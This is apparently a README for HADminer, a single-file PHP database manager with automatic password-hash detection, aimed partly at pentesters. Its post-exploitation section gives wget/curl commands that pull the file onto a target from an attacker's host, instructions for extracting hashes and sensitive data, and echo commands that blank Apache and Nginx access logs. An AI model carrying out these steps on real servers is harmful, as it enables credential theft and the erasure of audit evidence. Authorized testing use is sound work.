# HADminer 🗄️

**A modern, single-file PHP database manager — built to go further than Adminer.**

One file. Zero dependencies. Drop it anywhere PHP runs and you get a full-featured database manager with a sleek dark UI, intelligent hash detection, multi-engine support and a built-in SQL editor. Whether you're a developer, a sysadmin, or a pentester, HADminer is designed to get out of your way and let you work fast.

> 📸 *Screenshots below were captured on a real [HackTheBox](https://hackthebox.com) machine during post-exploitation.*

---

## Screenshots

### 🔐 Login — Driver auto-detection
![Login](screenshots/login.png)

### 🗄️ Database overview
![Databases](screenshots/databases.png)

### 📋 Table list — row counts & empty detection at a glance
![Tables](screenshots/tables.png)

### 🔑 Hash detection in action — bcrypt spotted automatically
![Hash Detection](screenshots/hash-detection.png)

---

## Why HADminer over Adminer?

| Feature | HADminer | Adminer |
|---|:---:|:---:|
| Modern dark UI | ✅ | ❌ |
| Auto hash detection (MD5, SHA-*, bcrypt, Argon2...) | ✅ | ❌ |
| Hash strength indicator (weak / medium / strong) | ✅ | ❌ |
| Row counts on all tables — single query | ✅ | ❌ |
| InnoDB empty-table false-positive fix | ✅ | ❌ |
| Live table search + "Hide empty" filter | ✅ | ❌ |
| SQL editor with Ctrl+Enter + query history | ✅ | ⚠️ basic |
| Driver auto-detect (MySQL → PostgreSQL → SQLite) | ✅ | ❌ |
| Single file, zero dependencies | ✅ | ✅ |

---

## Features

- **Multi-engine** — MySQL / MariaDB, PostgreSQL, SQLite with auto-detection
- **Intelligent hash detection** — 16+ algorithms identified automatically on any column:
  - 🔴 Weak: MD5, NTLM, SHA-1, MySQL v3
  - 🟠 Medium: SHA-256, WordPress/phpBB, Werkzeug PBKDF2
  - 🟢 Strong: bcrypt, Argon2, SHA-512, Drupal, Django PBKDF2
- **Smart table list** — row counts in one query, InnoDB-aware, live filter, "Hide empty" toggle
- **SQL editor** — Ctrl+Enter to run, 20-query history, quick SELECT shortcut
- **Read-only by default** — browse safely without risk of accidental writes
- **Zero setup** — no Composer, no npm, no config files

---

## Quick Start

```bash
# PHP built-in server
php -S localhost:8080 hadminer.php

# Apache / Nginx
cp hadminer.php /var/www/html/
```

Then open `http://localhost:8080` in your browser.

---

## 🔴 Pentest / Post-Exploitation Usage

HADminer is particularly useful during **post-exploitation** when you have access to a server running PHP and want to inspect its databases quickly without installing heavy tools.

### Step 1 — Transfer the file to the target

From your attack machine, serve the file and pull it on the target:

```bash
# On your machine (Kali) — start a quick HTTP server
cd /home/kali/hadminer
python3 -m http.server 8888
```

```bash
# On the target — download it
wget http://<YOUR_IP>:8888/hadminer.php -O /var/www/html/hadminer.php
# or
curl http://<YOUR_IP>:8888/hadminer.php -o /var/www/html/hadminer.php
```

### Step 2 — Access it via browser

```
http://<TARGET_IP>/hadminer.php
```

Connect using the database credentials found on the target (`.env`, `config.php`, `wp-config.php`, etc.).

### Step 3 — Do your work

- Browse databases and tables
- Extract password hashes — HADminer will identify the algorithm automatically
- Run custom SQL queries to retrieve sensitive data
- Check table structure to understand the application

### Step 4 — ⚠️ Clean up after yourself

> **Always remove HADminer when you're done.** Leaving a web shell or management tool on a target is a serious operational security risk.

```bash
# On the target — remove the file
rm /var/www/html/hadminer.php

# Verify it's gone
ls /var/www/html/hadminer.php  # should return "No such file or directory"
```

Also clear your browser history and the target's web server access logs if needed:

```bash
# Apache
echo "" > /var/log/apache2/access.log

# Nginx
echo "" > /var/log/nginx/access.log
```

---

## Requirements

- PHP 8.1+
- Extensions: `pdo`, `pdo_mysql` (+ `pdo_pgsql` / `pdo_sqlite` as needed)
- See `requirements.txt` for full details

---

## Security Notes

- Credentials stored in PHP session only — never in cookies or URL
- Table/database names validated server-side against real objects (no injection via URL)
- All output HTML-escaped
- **For internal, authorized, or pentest use only — do not expose to the public internet**

---

## License

MIT
